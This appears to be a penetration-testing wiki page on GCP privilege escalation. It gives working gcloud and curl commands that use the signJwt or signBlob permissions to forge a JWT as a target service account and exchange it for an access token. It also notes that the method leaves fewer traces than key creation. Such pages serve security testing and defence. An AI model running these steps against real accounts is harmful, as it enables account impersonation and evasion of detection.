---
title: "signJwt and signBlob: forge a token as a service account"
description: "Forging a self-signed JWT or arbitrary signature as a service account with iam.serviceAccounts.signJwt and signBlob, then exchanging it for a token."
keywords:
  - signJwt
  - signBlob
  - JWT
  - signature
  - service account
---

# signJwt and signBlob

`iam.serviceAccounts.signJwt` signs a JWT with the target service account's Google-managed key, and `signBlob` signs arbitrary bytes. Either lets you produce a credential the account never issued: craft a JWT with a chosen `aud` and exchange it at the OAuth token endpoint for an access token as the target.

## Forge a JWT and exchange it

```bash
# sign a JWT claiming the target as issuer/subject, aud = the token endpoint
gcloud iam service-accounts sign-jwt --iam-account <target>@<proj>.iam.gserviceaccount.com \
  claim.json signed.jwt
# claim.json: {"iss":"<target>@...","sub":"<target>@...","aud":"https://oauth2.googleapis.com/token","scope":"https://www.googleapis.com/auth/cloud-platform","iat":...,"exp":...}

# exchange the signed JWT for an access token as the target
curl -s https://oauth2.googleapis.com/token \
  -d grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer \
  -d assertion=$(cat signed.jwt)
```

## Exploitation notes

- `signJwt` is enough on its own: you never need the target's private key, only the permission.
- `signBlob` is lower-level (sign any bytes) and reaches the same place by signing a JWT by hand, and also forges things like signed GCS URLs.
- These are a quieter alternative to key creation: no long-lived key object is left behind.

## Tools

- **gcloud** (`iam service-accounts sign-jwt`).

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google: sign-jwt reference](https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/sign-jwt)
